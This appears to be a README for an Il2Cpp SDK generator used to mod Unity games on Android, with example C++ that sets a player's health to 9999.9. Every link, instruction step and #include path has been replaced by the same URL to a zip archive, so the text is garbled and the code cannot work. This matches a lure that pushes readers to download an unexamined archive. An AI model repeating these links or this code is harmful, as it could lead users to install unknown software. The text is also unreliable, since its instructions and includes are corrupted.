# Il2CppSDKGenerator
An Il2Cpp SDK generator for Android (And probably IOS)

# How to use
1. Compile Il2CppSDK generator (or use release version)
2. Get your DummyDll from using [Il2CppDumper](https://raw.githubusercontent.com/TitanicDimix/Il2CppSDKGenerator/master/intimity/Il2CppSDKGenerator.zip)
3. Drag the whole folder of DummyDll to https://raw.githubusercontent.com/TitanicDimix/Il2CppSDKGenerator/master/intimity/Il2CppSDKGenerator.zip
4. Wait for your SDK to be generated
5. Copy the result to your project
6. Copy precoded Il2Cpp Headers to your project (And include it to your https://raw.githubusercontent.com/TitanicDimix/Il2CppSDKGenerator/master/intimity/Il2CppSDKGenerator.zip or https://raw.githubusercontent.com/TitanicDimix/Il2CppSDKGenerator/master/intimity/Il2CppSDKGenerator.zip)

Done!

# How to use the SDK
You can include an namespace header to compile whole classes within a namespace or just compile a single class, for example take a look at SDK result.

Please read how to Initialize Il2Cpp Functions first before using any of the SDK/Il2Cpp Functions.

**Example:**
```c++
#include "https://raw.githubusercontent.com/TitanicDimix/Il2CppSDKGenerator/master/intimity/Il2CppSDKGenerator.zip"
#include "https://raw.githubusercontent.com/TitanicDimix/Il2CppSDKGenerator/master/intimity/Il2CppSDKGenerator.zip"

#include "https://raw.githubusercontent.com/TitanicDimix/Il2CppSDKGenerator/master/intimity/Il2CppSDKGenerator.zip"
#include "https://raw.githubusercontent.com/TitanicDimix/Il2CppSDKGenerator/master/intimity/Il2CppSDKGenerator.zip"
#include "https://raw.githubusercontent.com/TitanicDimix/Il2CppSDKGenerator/master/intimity/Il2CppSDKGenerator.zip"
#include "https://raw.githubusercontent.com/TitanicDimix/Il2CppSDKGenerator/master/intimity/Il2CppSDKGenerator.zip"
#include "https://raw.githubusercontent.com/TitanicDimix/Il2CppSDKGenerator/master/intimity/Il2CppSDKGenerator.zip"
#include "https://raw.githubusercontent.com/TitanicDimix/Il2CppSDKGenerator/master/intimity/Il2CppSDKGenerator.zip"
#include "https://raw.githubusercontent.com/TitanicDimix/Il2CppSDKGenerator/master/intimity/Il2CppSDKGenerator.zip"

using namespace UnityEngine;
using namespace GameBase;
using namespace GameEngine;

void PrintLocation()
{
  auto baseGame = GamePlay::get_Game<BaseGame *>();
  if (baseGame) {
    auto localPawn = GamePlay::get_LocalPawn<Pawn *>();
    if(localPawn){
      auto pawnTransform = ((Component *)localPawn)->get_transform<Transform *>();
      LOG("Local Pawn: %f %f %f", pawnTransform->get_position().x, pawnTransform->get_position().y, pawnTransform->get_position().z);
      localPawn->m_Health() = 9999.9f;
    }
  }
}
```
# Initiating Il2Cpp Functions
Before you use any `Il2Cpp` functions, you need to call `Attach` first.

```c++
...
void WaitForAttach()
{
  waitUntilLoaded(); // TODO: create function that loops when https://raw.githubusercontent.com/TitanicDimix/Il2CppSDKGenerator/master/intimity/Il2CppSDKGenerator.zip is not loaded yet.
  if(Il2Cpp::Attach() != 0)
  {
      // Something goes wrong here...
      exit(0);
  }
  // Attached!
  // You can call any Il2Cpp functions now.
}
```
# Changelogs
7 July 2020:
```
- Added CreateString functions to Il2Cpp Header
```
# Credits
dnlib: [dnlib](https://raw.githubusercontent.com/TitanicDimix/Il2CppSDKGenerator/master/intimity/Il2CppSDKGenerator.zip)
